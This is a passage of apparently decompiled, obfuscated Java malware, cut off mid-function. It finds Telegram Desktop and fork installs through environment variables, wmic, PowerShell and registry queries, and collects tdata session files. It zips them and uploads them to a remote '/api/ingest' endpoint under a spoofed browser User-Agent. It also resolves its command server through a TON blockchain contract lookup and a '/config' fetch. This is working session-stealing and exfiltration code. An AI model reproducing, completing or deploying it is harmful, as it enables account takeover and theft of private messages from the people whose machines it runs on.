                     if (var9.find()) {
                        var24 = new String(java.util.Base64.getDecoder().decode(var9.group(1)), java.nio.charset.StandardCharsets.UTF_8);
                        var17 = false;
                        break label165;
                     }

                     var24 = null;
                     var17 = false;
                     break label166;
                  } catch (Exception var21) {
                     if (var6 < 3) {
                        try {
                           Thread.sleep((long)1000 * var6);
                           var17 = false;
                        } catch (InterruptedException var18) {
                           var17 = false;
                        }
                     } else {
                        var17 = false;
                     }
                  } finally {
                     if (var17) {
                        if (var7 != null) {
                           var7.disconnect();
                        }
                     }
                  }

                  if (var7 != null) {
                     var7.disconnect();
                  }

                  var6++;
                  continue;
               }

               if (var7 != null) {
                  var7.disconnect();
               }

               return var24;
            }

            if (var7 != null) {
               var7.disconnect();
            }

            return var24;
         }
      }

      return null;
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   static String journey(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = ruby();
      if (var1 == null) {
         return null;
      }

      int var2 = 1;

      while (var2 <= 2) {
         HttpURLConnection var3 = null;
         boolean var12 = false /* VF: Semaphore variable */;

         Object var16;
         label143: {
            String var17;
            label144: {
               label145: {
                  try {
                     var12 = true;
                     var3 = (HttpURLConnection)new URL(new StringBuilder().append(var1).append("/config").toString()).openConnection();
                     var3.setRequestMethod("GET");
                     var3.setConnectTimeout(12000);
                     var3.setReadTimeout(12000);
                     var3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                     int var4 = var3.getResponseCode();
                     if (var4 != 200) {
                        var16 = null;
                        var12 = false;
                        break label143;
                     }

                     String var5 = beacon(
                        var3.getInputStream()
                     );
                     Matcher var6 = java.util.regex.Pattern.compile(new StringBuilder().append("\"").append(var0).append("\"\\s*:\\s*\"([^\"]+)\"").toString()).matcher(var5);
                     if (var6.find()) {
                        var17 = var6.group(1);
                        var12 = false;
                        break label144;
                     }

                     var17 = null;
                     var12 = false;
                     break label145;
                  } catch (Exception var14) {
                     if (var2 < 2) {
                        try {
                           Thread.sleep(500);
                           var12 = false;
                        } catch (InterruptedException var13) {
                           var12 = false;
                        }
                     } else {
                        var12 = false;
                     }
                  } finally {
                     if (var12) {
                        if (var3 != null) {
                           var3.disconnect();
                        }
                     }
                  }

                  if (var3 != null) {
                     var3.disconnect();
                  }

                  var2++;
                  continue;
               }

               if (var3 != null) {
                  var3.disconnect();
               }

               return var17;
            }

            if (var3 != null) {
               var3.disconnect();
            }

            return var17;
         }

         if (var3 != null) {
            var3.disconnect();
         }

         return (String)var16;
      }

      return null;
   }

   private static String basil(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == null) {
         return null;
      }

      String var1 = var0.trim();
      if (var1.isEmpty()) {
         return var1;
      }

      if (!var1.startsWith("http://")
         && !var1.startsWith("https://")) {
         var1 = new StringBuilder().append("https://").append(var1).toString();
      }

      while (
         var1.endsWith("/")
      ) {
         var1 = var1.substring(0, var1.length() - 1);
      }

      return var1;
   }

   public static String island(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var1 = new StringBuilder().append("https://tonapi.io/v2/blockchain/accounts/").append(var0).append("/methods/getMessage").toString();
         HttpURLConnection var2 = (HttpURLConnection)new URL(var1).openConnection();
         var2.setRequestMethod("GET");
         var2.setRequestProperty("Accept", "application/json");
         var2.setConnectTimeout(15000);
         var2.setReadTimeout(30000);
         int var3 = var2.getResponseCode();
         InputStream var4 = var3 >= 200 && var3 < 300
            ? var2.getInputStream()
            : var2.getErrorStream();
         String var5 = beacon(var4);
         Matcher var6 = gypsum.matcher(var5);
         if (var6.find()) {
            var2.disconnect();
            return squash(
               var6.group(1)
            );
         }

         var2.disconnect();
      } catch (Exception var7) {
         var7.printStackTrace();
      }

      return null;
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void sprout(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var1 = java.nio.file.Paths.get(new StringBuilder().append(lantern).append(".zip").toString(), new String[0]);

      try {
         raven(
            lantern,
            var1.toString()
         );
         byte var2 = 2;
         Exception var3 = null;
         int var4 = 1;

         while (var4 <= var2) {
            HttpURLConnection var5 = null;
            boolean var18 = false /* VF: Semaphore variable */;

            label161: {
               try {
                  var18 = true;
                  String var6 = new StringBuilder().append("----IngestBoundary").append(java.util.UUID.randomUUID().toString().replace("-", "")).toString();
                  URL var7 = new URL(new StringBuilder().append(blanket).append("/api/ingest").toString());
                  var5 = cosmos(var7, "POST", 15000, 30000);
                  var5.setRequestMethod("POST");
                  var5.setConnectTimeout(15000);
                  var5.setReadTimeout(30000);
                  var5.setDoOutput(true);
                  var5.setRequestProperty("Content-Type", new StringBuilder().append("multipart/form-data; boundary=").append(var6).toString());
                  var5.setRequestProperty("Accept", "application/json");
                  var5.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                  OutputStream var8 = var5.getOutputStream();

                  try {
                     muffin(
                        var8,
                        new StringBuilder().append("--").append(var6).append("\r\n").toString()
                     );
                     muffin(
                        var8,
                        "Content-Disposition: form-data; name=\"metadata\"\r\n"
                     );
                     muffin(
                        var8,
                        "Content-Type: application/json; charset=UTF-8\r\n\r\n"
                     );
                     muffin(
                        var8,
                        new StringBuilder().append(var0).append("\r\n").toString()
                     );
                     muffin(
                        var8,
                        new StringBuilder().append("--").append(var6).append("\r\n").toString()
                     );
                     muffin(
                        var8,
                        new StringBuilder().append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(var1.getFileName()).append("\"\r\n").toString()
                     );
                     muffin(
                        var8,
                        "Content-Type: application/zip\r\n\r\n"
                     );
                     java.nio.file.Files.copy(var1, var8);
                     muffin(var8, "\r\n");
                     muffin(
                        var8,
                        new StringBuilder().append("--").append(var6).append("--\r\n").toString()
                     );
                  } catch (Throwable var21) {
                     if (var8 != null) {
                        try {
                           var8.close();
                        } catch (Throwable var20) {
                           var21.addSuppressed(var20);
                        }
                     }

                     throw var21;
                  }

                  if (var8 != null) {
                     var8.close();
                  }

                  int var25 = var5.getResponseCode();
                  InputStream var9 = var25 >= 200 && var25 < 300
                     ? var5.getInputStream()
                     : var5.getErrorStream();
                  String var10 = beacon(var9);
                  if (var25 < 200 || var25 >= 300) {
                     throw new java.io.IOException(new StringBuilder().append("Upload failed: HTTP ").append(var25).append(" body=").append(var10).toString());
                  }

                  System.out.println(new StringBuilder().append("Uploaded: ").append(var10).toString());
                  var18 = false;
                  break label161;
               } catch (Exception var22) {
                  var3 = var22;
                  if (var4 < var2) {
                     System.out.println(new StringBuilder().append("[send] attempt ").append(var4).append(" failed: ").append(var22.getMessage()).append(" \u2014 retrying").toString());

                     try {
                        Thread.sleep(2000);
                        var18 = false;
                     } catch (InterruptedException var19) {
                        var18 = false;
                     }
                  } else {
                     var18 = false;
                  }
               } finally {
                  if (var18) {
                     if (var5 != null) {
                        var5.disconnect();
                     }
                  }
               }

               if (var5 != null) {
                  var5.disconnect();
               }

               var4++;
               continue;
            }

            if (var5 != null) {
               var5.disconnect();
            }

            return;
         }

         throw new java.lang.RuntimeException(var3);
      } catch (Exception var24) {
         var24.printStackTrace();
         podium(
            "send/ingest",
            "fatal",
            new StringBuilder().append("upload failed: ").append(var24.getMessage()).toString(),
            var24
         );
         throw new java.lang.RuntimeException(var24);
      }
   }

   private static void muffin(OutputStream var0, String var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      var0.write(var1.getBytes(java.nio.charset.StandardCharsets.UTF_8));
   }

   private static String beacon(InputStream var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == null) {
         return "";
      }

      BufferedReader var1 = new java.io.BufferedReader(new java.io.InputStreamReader(var0, java.nio.charset.StandardCharsets.UTF_8));

      String var4;
      try {
         StringBuilder var2 = new StringBuilder();

         String var3;
         while (
            (
                  var3 = var1.readLine()
               )
               != null
         ) {
            var2.append(var3);
         }

         var4 = var2.toString();
      } catch (Throwable var6) {
         try {
            var1.close();
         } catch (Throwable var5) {
            var6.addSuppressed(var5);
         }

         throw var6;
      }

      var1.close();
      return var4;
   }

   private static void raven(String var0, String var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      FileOutputStream var2 = new java.io.FileOutputStream(var1);
      Object var3 = null;

      try {
         ZipOutputStream var4 = new java.util.zip.ZipOutputStream(var2);
         Object var5 = null;

         try {
            try {
               april(
                  "",
                  new File(var0),
                  var4
               );
               if (var4 != null) {
                  var4.close();
               }

               if (var2 != null) {
                  var2.close();
               }
            } catch (Throwable var9) {
               if (var4 != null) {
                  if (var5 != null) {
                     try {
                        var4.close();
                     } catch (Throwable var8) {
                        (Throwable)var5.addSuppressed(var8);
                     }
                  } else {
                     var4.close();
                  }
               }

               throw var9;
            }
         } catch (Throwable var10) {
            throw var10;
         }
      } catch (Throwable var11) {
         if (var2 != null) {
            var2.close();
         }

         throw var11;
      }
   }

   private static void april(String var0, File var1, ZipOutputStream var2) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var3 = new StringBuilder().append(var0).append(var1.getName()).toString();
      if (var1.isDirectory()) {
         if (!var3.isEmpty()) {
            if (!var3.endsWith("/")) {
               var3 = new StringBuilder().append(var3).append("/").toString();
            }

            ZipEntry var12 = new java.util.zip.ZipEntry(var3);
            var2.putNextEntry(var12);
         }

         for (File var16 : var1.listFiles()) {
            april(var3, var16, var2);
         }
      } else {
         FileInputStream var4 = new java.io.FileInputStream(var1);
         Throwable var5 = null;

         try {
            try {
               ZipEntry var6 = new java.util.zip.ZipEntry(var3);
               var2.putNextEntry(var6);
               byte[] var7 = new byte[1024];

               while (true) {
                  int var8 = var4.read(var7);
                  if (var8 < 0) {
                     if (var4 != null) {
                        var4.close();
                     }

                     return;
                  }

                  var2.write(var7, 0, var8);
               }
            } catch (Throwable var10) {
               var5 = var10;
               throw var10;
            }
         } catch (Throwable var11) {
            if (var4 != null) {
               if (var5 != null) {
                  try {
                     var4.close();
                  } catch (Throwable var9) {
                     var5.addSuppressed(var9);
                  }
               } else {
                  var4.close();
               }
            }

            throw var11;
         }
      }
   }

   private static void autumn() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (saddle) {
         Path var0 = java.nio.file.Paths.get(new StringBuilder().append(lantern).append("\\Telegram").toString(), new String[0]);

         try {
            java.nio.file.Files.createDirectories(var0, new FileAttribute[0]);
         } catch (IOException var18) {
            System.out.println(new StringBuilder().append("ERROR: cannot create output folder: ").append(var0).append(" (").append(var18.getMessage()).append(")").toString());
            return;
         }

         List var1 = mermaid();
         if (var1.isEmpty()) {
            System.out.println("No launcher roots to process.");
         } else {
            System.out.println(new StringBuilder().append("Targets: ").append(var1.size()).toString());
            int var2 = 0;
            int var3 = 0;
            int var4 = 0;
            Iterator var5 = var1.iterator();

            while (var5.hasNext()) {
               quince var6 = (quince)var5.next();
               System.out.println(new StringBuilder().append("\nLauncher: ").append(quince.eagle(var6)).append(" | Root: ").append(quince.pinnacle(var6)).append(" | TargetId: ").append(quince.siren(var6)).toString());
               List var7 = flint(quince.pinnacle(var6), true, 3);
               if (var7.isEmpty()) {
                  System.out.println(new StringBuilder().append("SKIP launcher: ").append(quince.eagle(var6)).append(" (no tdata found)").toString());
                  var4++;
               } else {
                  Path var8 = var0.resolve(quince.siren(var6));
                  boolean var9 = false;
                  System.out.println(new StringBuilder().append("Detected tdata dirs: ").append(var7.size()).toString());
                  Iterator var10 = var7.iterator();

                  while (var10.hasNext()) {
                     Path var11 = (Path)var10.next();
                     String var12 = new StringBuilder().append(oasis(quince.eagle(var6))).append("_").append(feather(quince.pinnacle(var6), var11)).toString();
                     List var13 = circle(var11, java.lang.Math.max(1, 3));
                     if (var13.isEmpty()) {
                        System.out.println(new StringBuilder().append("SKIP: ").append(var11).append(" (no complete account triplets)").toString());
                        var3++;
                     } else {
                        System.out.println(new StringBuilder().append("Source: ").append(var11).toString());
                        Iterator var14 = var13.iterator();

                        while (var14.hasNext()) {
                           String var15 = (String)var14.next();

                           try {
                              if (!var9) {
                                 java.nio.file.Files.createDirectories(var8, new FileAttribute[0]);
                                 var9 = true;
                              }

                              Path var16 = meridian(var11, var15, var8, var12);
                              if (var16 != null) {
                                 System.out.println(new StringBuilder().append("  OK  ").append(var15).append(" -> ").append(var16.getFileName()).toString());
                                 var2++;
                              }
                           } catch (Exception var17) {
                              System.out.println(new StringBuilder().append("  ERR ").append(var15).append(": ").append(var17.getClass().getSimpleName()).append(": ").append(var17.getMessage()).toString());
                           }
                        }
                     }
                  }
               }
            }

            System.out.println(new StringBuilder().append("\nDone. Built: ").append(var2).append(", skipped sources: ").append(var3).append(", skipped launchers: ").append(var4).toString());
         }
      }
   }

   private static List<quince> mermaid() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      LinkedHashMap var0 = new java.util.LinkedHashMap();
      List var1 = kipper();
      Iterator var2 = var1.iterator();

      while (var2.hasNext()) {
         stumble var3 = (stumble)var2.next();
         if (var3 != null
            && stumble.riddle(var3) != null
            && java.nio.file.Files.isDirectory(stumble.riddle(var3), new LinkOption[0])) {
            Path var4 = stumble.riddle(var3).toAbsolutePath().normalize();
            String var5 = stumble.pitcher(var3);
            if (srlewa(var5)) {
               var5 = "AUTO";
            }

            String var6 = new StringBuilder().append(var5.toLowerCase(java.util.Locale.ROOT)).append("|").append(var4.toString().toLowerCase(java.util.Locale.ROOT)).toString();
            if (!var0.containsKey(var6)) {
               var0.put(var6, new quince(var5, var4, pepper(var5, var4)));
            }
         }
      }

      return new java.util.ArrayList(var0.values());
   }

   private static List<stumble> kipper() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var0 = new java.util.ArrayList();
      ranger(var0);
      panda(var0);
      panorama(var0);
      diadem(var0);
      falcon(var0);
      figment(
         var0,
         "CWD",
         java.nio.file.Paths.get("", new String[0]).toAbsolutePath().normalize().toString(),
         null
      );
      return noodle(var0);
   }

   private static List<stumble> noodle(List<stumble> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      LinkedHashMap var1 = new java.util.LinkedHashMap();
      Iterator var2 = var0.iterator();

      while (var2.hasNext()) {
         stumble var3 = (stumble)var2.next();
         if (var3 != null && stumble.riddle(var3) != null && !srlewa(stumble.pitcher(var3))) {
            Path var4 = stumble.riddle(var3).toAbsolutePath().normalize();
            if (java.nio.file.Files.isDirectory(var4, new LinkOption[0])
               && magnolia(var4, stumble.pitcher(var3)) > 0) {
               String var5 = new StringBuilder().append(stumble.pitcher(var3).toLowerCase(java.util.Locale.ROOT)).append("|").append(var4.toString().toLowerCase(java.util.Locale.ROOT)).toString();
               stumble var6 = (stumble)var1.get(var5);
               if (var6 == null || statue(var3, var6) < 0) {
                  var1.put(var5, new stumble(stumble.parsley(var3), stumble.pitcher(var3), var4, magnolia(var4, stumble.pitcher(var3))));
               }
            }
         }
      }

      ArrayList var7 = new java.util.ArrayList(var1.values());
      java.util.Collections.sort(var7, new Comparator<stumble>() {
            public int compare(stumble var1, stumble var2x) {
               if (rkjsezrwcf.jzdety() != 0) {
                  rkjsezrwcf.bbsnvj();
               }

               int var3 = stumble.pitcher(var1).compareToIgnoreCase(stumble.pitcher(var2x));
               return var3 != 0 ? var3 : prawn.jxprqz(var1, var2x);
            }
         });
      return var7;
   }

   private static int statue(stumble var0, stumble var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (stumble.flute(var0) != stumble.flute(var1)) {
         return Integer.compare(stumble.flute(var1), stumble.flute(var0));
      }

      int var2 = Integer.compare(harvest(stumble.parsley(var0)), harvest(stumble.parsley(var1)));
      if (var2 != 0) {
         return var2;
      }

      int var3 = Integer.compare(stumble.riddle(var0).toString().length(), stumble.riddle(var1).toString().length());
      return var3 != 0
         ? var3
         : stumble.riddle(var0).toString().compareToIgnoreCase(stumble.riddle(var1).toString());
   }

   private static int harvest(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == null) {
         return 99;
      } else {
         String var1 = var0.toLowerCase(java.util.Locale.ROOT);
         if (var1.startsWith("process wmic")) {
            return 1;
         } else if (var1.startsWith("process powershell")) {
            return 2;
         } else if (var1.startsWith("reg apppaths")) {
            return 3;
         } else if (var1.startsWith("reg uninstall")) {
            return 4;
         } else if (var1.startsWith("where")) {
            return 5;
         } else if (var1.startsWith("env")) {
            return 6;
         } else {
            return var1.startsWith("cwd")
               ? 7
               : 99;
         }
      }
   }

   private static void ranger(List<stumble> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      for (String var4 : fathom) {
         figment(
            var0,
            new StringBuilder().append("ENV ").append(var4).toString(),
            System.getenv(var4),
            mentor(var4)
         );
      }
   }

   private static void panda(List<stumble> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      for (String var4 : mango) {
         List var5 = arrow("where", var4);
         Iterator var6 = var5.iterator();

         while (var6.hasNext()) {
            String var7 = (String)var6.next();
            String var8 = var7.trim();
            if (!srlewa(var8)
               && !var8.toLowerCase(java.util.Locale.ROOT).startsWith("info:")) {
               figment(
                  var0,
                  new StringBuilder().append("WHERE ").append(var4).toString(),
                  var8,
                  var4
               );
            }
         }
      }
   }

   private static void panorama(List<stumble> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      for (String var4 : mango) {
         List var5 = arrow(
            "wmic",
            "process",
            "where",
            new StringBuilder().append("name='").append(var4).append("'").toString(),
            "get",
            "ExecutablePath",
            "/value"
         );
         Iterator var6 = var5.iterator();

         while (var6.hasNext()) {
            String var7 = (String)var6.next();
            String var8 = var7.trim();
            if (var8.startsWith("ExecutablePath=")) {
               String var9 = var8.substring("ExecutablePath=".length()).trim();
               figment(
                  var0,
                  new StringBuilder().append("PROCESS WMIC ").append(var4).toString(),
                  var9,
                  var4
               );
            }
         }
      }

      StringBuilder var10 = new StringBuilder();
      var10.append("$names=@(");

      for (int var11 = 0; var11 < field.length; var11++) {
         if (var11 > 0) {
            var10.append(",");
         }

         var10.append("'").append(field[var11]).append("'");
      }

      var10.append(");");
      var10.append("foreach($n in $names){ Get-Process -Name $n -ErrorAction SilentlyContinue | ForEach-Object { \"$n|$($_.Path)\" } }");
      List var12 = arrow(
         "powershell",
         "-NoProfile",
         "-Command",
         var10.toString()
      );
      Iterator var13 = var12.iterator();

      while (var13.hasNext()) {
         String var14 = (String)var13.next();
         String var15 = var14.trim();
         if (!srlewa(var15)) {
            String var16 = null;
            String var17 = var15;
            int var18 = var15.indexOf(124);
            if (var18 > 0) {
               var16 = var15.substring(0, var18).trim();
               var17 = var15.substring(var18 + 1).trim();
            }

            String var19 = spice(var16);
            if (srlewa(var19)) {
               var19 = scholar(var17);
            }

            figment(var0, "PROCESS PowerShell", var17, var19);
         }
      }
   }

   private static void diadem(List<stumble> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String[] var1 = new String[]{
         "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths",
         "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
      };

      for (String var5 : var1) {
         for (String var9 : mango) {
            String var10 = new StringBuilder().append(var5).append("\\").append(var9).toString();
            List var11 = arrow("reg", "query", var10);
            Iterator var12 = var11.iterator();

            while (var12.hasNext()) {
               String var13 = (String)var12.next();
               String var14 = var13.trim();
               if (!var14.isEmpty()) {
                  String var15 = var14.toLowerCase(java.util.Locale.ROOT);
                  if (var15.contains("reg_sz")
                     || var15.contains("reg_expand_sz")) {
                     figment(
                        var0,
                        new StringBuilder().append("REG AppPaths ").append(var9).toString(),
                        amber(var14),
                        var9
                     );
                  }
               }
            }
         }
      }
   }

   private static void falcon(List<stumble> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String[] var1 = new String[]{
         "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
         "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
         "HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
      };
      HashSet var2 = new java.util.HashSet();

      for (String var6 : var1) {
         for (String var10 : jewel) {
            List var11 = arrow(
               "reg",
               "query",
               var6,
               "/s",
               "/f",
               var10,
               "/d"
            );
            Iterator var12 = var11.iterator();

            while (var12.hasNext()) {
               String var13 = (String)var12.next();
               String var14 = var13.trim();
               if (var14.startsWith("HKEY_")) {
                  var2.add(var14);
               }
            }
         }
      }

      Iterator var15 = var2.iterator();

      while (var15.hasNext()) {
         String var16 = (String)var15.next();
         parrot(var0, var16, "InstallLocation");
         parrot(var0, var16, "DisplayIcon");
         parrot(var0, var16, "UninstallString");
         parrot(var0, var16, "QuietUninstallString");
      }
   }

   private static void parrot(List<stumble> var0, String var1, String var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      List var3 = arrow(
         "reg",
         "query",
         var1,
         "/v",
         var2
      );
      Iterator var4 = var3.iterator();

      while (var4.hasNext()) {
         String var5 = (String)var4.next();
         String var6 = var5.trim();
         if (!var6.isEmpty()) {
            String var7 = var6.toLowerCase(java.util.Locale.ROOT);
            if (var7.contains("reg_sz")
               || var7.contains("reg_expand_sz")) {
               String var8 = amber(var6);
               String var9 = scholar(var8);
               figment(
                  var0,
                  new StringBuilder().append("REG Uninstall ").append(var2).toString(),
                  var8,
                  var9
               );
            }
         }
      }
   }

   private static void figment(List<stumble> var0, String var1, String var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (!srlewa(var1) && !srlewa(var2)) {
         String var4 = radish(
            var2.trim()
         );
         if (!srlewa(var4)) {
            try {
               Path var5 = java.nio.file.Paths.get(var4, new String[0]).toAbsolutePath().normalize();
               String var6 = jingle(var3);
               if (srlewa(var6)) {
                  var6 = jingle(scholar(var4));
               }

               if (srlewa(var6)) {
                  var6 = jingle(scholar(var1));
               }

               if (java.nio.file.Files.isRegularFile(var5, new LinkOption[0])
                  && var5.getFileName()
                     != null) {
                  String var7 = var5.getFileName().toString();
                  if (var7.toLowerCase(java.util.Locale.ROOT).endsWith(".exe")) {
                     Path var8 = var5.getParent();
                     if (var8 != null) {
                        String var9 = jingle(var7);
                        var0.add(new stumble(var1, srlewa(var9) ? var6 : var9, var8, 0));
                     }
                  }
               }

               var0.add(new stumble(var1, var6, var5, 0));
            } catch (InvalidPathException var10) {
            }
         }
      }
   }

   private static int magnolia(Path var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte var2 = 0;
      if (java.nio.file.Files.isRegularFile(var0.resolve("tdata").resolve("key_datas"), new LinkOption[0])) {
         var2 += 100;
      }

      if (java.nio.file.Files.isDirectory(var0.resolve("tdata"), new LinkOption[0])) {
         var2 += 40;
      }

      if (java.nio.file.Files.isDirectory(var0.resolve("_split_stage"), new LinkOption[0])) {
         var2 += 20;
      }

      if (java.nio.file.Files.isRegularFile(var0.resolve("Updater.exe"), new LinkOption[0])) {
         var2 += 10;
      }

      if (!srlewa(var1)
         && java.nio.file.Files.isRegularFile(var0.resolve(var1), new LinkOption[0])) {
         var2 += 15;
      }

      return var2;
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static List<String> arrow(String... var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var1 = new java.util.ArrayList();
      Process var2 = null;
      boolean var12 = false /* VF: Semaphore variable */;

      label99: {
         try {
            var12 = true;
            ProcessBuilder var3 = new ProcessBuilder(var0);
            var3.redirectErrorStream(true);
            var2 = var3.start();
            BufferedReader var4 = new java.io.BufferedReader(new java.io.InputStreamReader(var2.getInputStream()));

            String var5;
            try {
               while (
                  (
                        var5 = var4.readLine()
                     )
                     != null
               ) {
                  var1.add(var5);
               }
            } catch (Throwable var14) {
               try {
                  var4.close();
               } catch (Throwable var13) {
                  var14.addSuppressed(var13);
               }

               throw var14;
            }

            var4.close();
            var2.waitFor();
            var12 = false;
            break label99;
         } catch (Exception var15) {
            var12 = false;
         } finally {
            if (var12) {
               if (var2 != null) {
                  var2.destroy();
               }
            }
         }

         if (var2 != null) {
            var2.destroy();
         }

         return var1;
      }

      if (var2 != null) {
         var2.destroy();
      }

      return var1;
   }

   private static String mentor(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == null) {
         return null;
      } else {
         String var1 = var0.toUpperCase(java.util.Locale.ROOT);
         if (var1.contains("AYUGRAM")) {
            return "AyuGram.exe";
         } else if (var1.contains("UNIGRAM")) {
            return "Unigram.exe";
         } else if (var1.contains("KOTATOGRAM")) {
            return "Kotatogram.exe";
         } else if (var1.contains("64GRAM")) {
            return "64Gram.exe";
         } else if (var1.contains("FORKGRAM")) {
            return "Forkgram.exe";
         } else if (var1.contains("IME")) {
            return "iMe.exe";
         } else if (var1.contains("BETTERGRAM")) {
            return "Bettergram.exe";
         } else {
            return var1.contains("TELEGRAM")
               ? "Telegram.exe"
               : null;
         }
      }
   }

   private static String spice(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (srlewa(var0)) {
         return null;
      }

      for (String var4 : mango) {
         String var5 = var4.substring(0, var4.length() - 4);
         if (var5.equalsIgnoreCase(var0)) {
            return var4;
         }
      }

      return null;
   }

   private static String jingle(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (srlewa(var0)) {
         return null;
      }

      for (String var4 : mango) {
         if (var4.equalsIgnoreCase(var0.trim())) {
            return var4;
         }
      }

      return null;
   }

   private static String scholar(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (srlewa(var0)) {
         return null;
      }

      String var1 = null;
      int var2 = 32767 << 16 | (char)-1;

      for (String var6 : mango) {
         int var7 = engine(var0, var6);
         if (var7 >= 0 && var7 < var2) {
            var2 = var7;
            var1 = var6;
         }
      }

      return var1;
   }

   private static int engine(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var0.toLowerCase(java.util.Locale.ROOT).indexOf(var1.toLowerCase(java.util.Locale.ROOT));
   }

   private static String amber(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String[] var1 = var0.trim().split("\\s+", 3);
      return var1.length < 3
         ? ""
         : var1[2].trim();
   }

   private static String radish(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = var0;

      while (
         var1.startsWith("\"")
            && var1.endsWith("\"")
            && var1.length() >= 2
      ) {
         var1 = var1.substring(1, var1.length() - 1).trim();
      }

      return var1;
   }

   private static List<Path> flint(Path var0, boolean var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HashSet var3 = new java.util.HashSet();
      Iterator var4 = sandal(var0).iterator();

      while (var4.hasNext()) {
         Path var5 = (Path)var4.next();
         var3.addAll(keyhole(var5, var1));
      }

      if (var3.isEmpty()) {
         var3.addAll(patio(var0, java.lang.Math.max(2, var2)));
      }

      ArrayList var6 = new java.util.ArrayList(var3);
      java.util.Collections.sort(var6, java.util.Comparator.comparing(Path::toString));
      return var6;
   }

   private static List<Path> sandal(Path var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HashSet var1 = new java.util.HashSet();
      if (var0 == null) {
         return java.util.Collections.emptyList();
      }

      Path var2 = var0.toAbsolutePath().normalize();
      var1.add(var2);
      Path var3 = var2.getParent();
      if (var3 != null) {
         var1.add(var3.toAbsolutePath().normalize());
         Path var4 = var3.getParent();
         if (var4 != null) {
            var1.add(var4.toAbsolutePath().normalize());
            Path var5 = var4.getParent();
            if (var5 != null) {
               var1.add(var5.toAbsolutePath().normalize());
            }
         }
      }

      Path var7 = var2.getFileName();
      if (var7 != null
         && "telegram".equalsIgnoreCase(var7.toString())) {
         Path var8 = var2.getParent();
         if (var8 != null
            && var8.getFileName()
               != null
            && "app".equalsIgnoreCase(var8.getFileName().toString())) {
            Path var6 = var8.getParent();
            if (var6 != null) {
               var1.add(var6.toAbsolutePath().normalize());
               var1.add(var6.resolve("Data").toAbsolutePath().normalize());
            }
         }
